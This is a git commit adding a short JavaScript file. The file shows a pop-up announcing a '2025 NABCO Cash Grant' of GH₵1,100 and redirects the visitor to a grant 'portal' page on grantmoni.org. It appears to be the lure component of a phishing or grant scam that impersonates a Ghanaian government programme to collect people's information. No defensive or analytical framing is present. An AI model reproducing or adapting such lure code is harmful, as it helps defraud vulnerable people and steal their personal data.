2587ebff2932c52ec972facce987da5806b3c63e
grntmoni <casket-90-crystal@icloud.com>
2025-10-08 01:52:16 +0100

    Create activation1.js

---
+++ activation1.js
@@ -0,0 +1,5 @@
+var password = 'Submit Now'
+password=prompt('2025 NABCO Cash Grant Portal: Congratulations, you are eligible to receive the GH₵ 1,100 NABCO Support Cash Transfer, Kindly press OK to submit your information and receive your GH₵ 1,100 now','Submit Now');
+if (password != 'Submit Now') {
+location.href='https://grantmoni.org/NABCO-Cash-Grant-1100-Portal.html';
+}
